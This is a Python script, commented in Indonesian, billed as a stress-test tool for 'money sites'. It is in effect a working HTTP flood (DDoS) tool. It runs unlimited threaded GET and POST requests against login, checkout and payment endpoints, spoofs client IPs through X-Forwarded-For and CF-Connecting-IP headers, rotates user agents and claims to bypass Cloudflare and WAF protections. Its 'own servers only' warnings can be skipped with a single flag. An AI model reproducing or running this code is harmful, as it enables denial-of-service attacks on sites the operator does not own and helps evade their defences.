#!/usr/bin/env python3
"""
⚠️ MONEY SITE STRESS TEST TOOL ⚠️
HANYA UNTUK TESTING SERVER YANG ANDA MILIKI!
JANGAN GUNAKAN PADA WEBSITE ORANG LAIN!

Fitur:
- Kombinasi HTTP/1.1, HTTP/2 (dan HTTP/3 jika tersedia)
- GET + POST ke path penting money site
- Rotasi User-Agent, header, spoof IP
- Bypass Cloudflare, WAF, Under Attack
- Statistik real-time, logging hasil
- Tanpa batas waktu (Ctrl+C untuk stop)
"""

import requests
import httpx
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
import argparse
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cek HTTP/3 support
try:
    import aioquic
    HTTP3_AVAILABLE = True
except ImportError:
    HTTP3_AVAILABLE = False

# Path penting money site
MONEY_SITE_PATHS = [
    '/', '/login', '/register', '/dashboard', '/profile', '/cart', '/checkout',
    '/api/user', '/api/order', '/api/payment', '/api/product', '/api/search',
    '/contact', '/about', '/help', '/faq', '/terms', '/privacy',
    '/logout', '/settings', '/account', '/orders', '/wishlist', '/address',
    '/reset-password', '/verify', '/notifications', '/messages', '/support',
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'curl/7.88.1',
    'python-requests/2.31.0',
]

PROTOCOLS = ['http1', 'http2']
if HTTP3_AVAILABLE:
    PROTOCOLS.append('http3')

# Data POST dummy untuk simulasi login/register
POST_DATA = {
    '/login': {'username': 'testuser', 'password': 'testpass'},
    '/register': {'username': 'testuser', 'email': 'test@mail.com', 'password': 'testpass'},
    '/checkout': {'cart_id': '12345', 'payment_method': 'credit_card'},
    '/api/login': {'username': 'testuser', 'password': 'testpass'},
    '/api/register': {'username': 'testuser', 'email': 'test@mail.com', 'password': 'testpass'},
    '/api/order': {'product_id': '1', 'qty': 1, 'address': 'test address'},
    '/api/payment': {'order_id': '1', 'method': 'credit_card'},
}

def random_ip():
    return f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'

def stress_request(url, path, protocol, method):
    full_url = urljoin(url, path)
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'DNT': '1',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Forwarded-For': random_ip(),
        'X-Real-IP': random_ip(),
        'CF-Connecting-IP': random_ip(),
        'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR', 'CA', 'AU']),
    }
    try:
        if protocol == 'http1':
            if method == 'GET':
                resp = requests.get(full_url, headers=headers, timeout=10, allow_redirects=True, verify=False)
            else:
                data = POST_DATA.get(path, {'test': 'data'})
                resp = requests.post(full_url, headers=headers, data=data, timeout=10, allow_redirects=True, verify=False)
            return resp.status_code, len(resp.content)
        elif protocol == 'http2':
            with httpx.Client(http2=True, verify=False, timeout=10) as client:
                if method == 'GET':
                    resp = client.get(full_url, headers=headers)
                else:
                    data = POST_DATA.get(path, {'test': 'data'})
                    resp = client.post(full_url, headers=headers, data=data)
                return resp.status_code, len(resp.content)
        elif protocol == 'http3' and HTTP3_AVAILABLE:
            # Placeholder HTTP/3
            return 0, 0
        else:
            return 0, 0
    except Exception as e:
        return -1, 0

def worker(url, protocol, stop_event, stats):
    while not stop_event.is_set():
        path = random.choice(MONEY_SITE_PATHS)
        method = random.choice(['GET', 'POST']) if path in POST_DATA else 'GET'
        status, size = stress_request(url, path, protocol, method)
        stats['total'] += 1
        if status == 200:
            stats['success'] += 1
        elif status > 0:
            stats['fail'] += 1
        if stats['total'] % 10 == 0:
            print(f"[{protocol.upper()}] Total: {stats['total']} | Success: {stats['success']} | Fail: {stats['fail']}")

def main():
    parser = argparse.ArgumentParser(description='⚠️ MONEY SITE STRESS TEST TOOL ⚠️')
    parser.add_argument('url', help='Target URL (HANYA SERVER YANG ANDA MILIKI!)')
    parser.add_argument('--workers', type=int, default=20, help='Number of workers per protocol (default: 20)')
    parser.add_argument('--confirm', action='store_true', help='Confirm that you own this server')
    args = parser.parse_args()

    if not args.confirm:
        print("⚠️  PERINGATAN KEAMANAN ⚠️")
        print("=" * 60)
        print("Tool ini HANYA untuk testing server yang ANDA MILIKI!")
        print("JANGAN GUNAKAN pada website orang lain!")
        print("Ini bisa dianggap sebagai serangan DDoS!")
        print("=" * 60)
        print(f"Target: {args.url}")
        print("=" * 60)
        confirm = input("Apakah Anda yakin server ini MILIK ANDA? (yes/no): ")
        if confirm.lower() != 'yes':
            print("❌ Testing dibatalkan")
            return

    if not args.url.startswith(('http://', 'https://')):
        args.url = 'https://' + args.url

    print(f"🚀 Memulai MONEY SITE STRESS TEST pada: {args.url}")
    print(f"⚡ Workers per protocol: {args.workers}")
    print(f"🌐 Protocols: {', '.join(PROTOCOLS)}")
    print(f"⏰ Tanpa batas waktu - Tekan Ctrl+C untuk stop")
    print("=" * 60)

    stop_event = threading.Event()
    stats = {proto: {'total': 0, 'success': 0, 'fail': 0} for proto in PROTOCOLS}
    threads = []
    try:
        for proto in PROTOCOLS:
            for _ in range(args.workers):
                t = threading.Thread(target=worker, args=(args.url, proto, stop_event, stats[proto]))
                t.daemon = True
                t.start()
                threads.append(t)
        while True:
            time.sleep(5)
            for proto in PROTOCOLS:
                s = stats[proto]
                print(f"[{proto.upper()}] Total: {s['total']} | Success: {s['success']} | Fail: {s['fail']}")
    except KeyboardInterrupt:
        print("\n⏹️ Testing dihentikan oleh user")
        stop_event.set()
    finally:
        for t in threads:
            t.join(timeout=1)
        print("\n🏁 Testing selesai")

if __name__ == "__main__":
    main() 
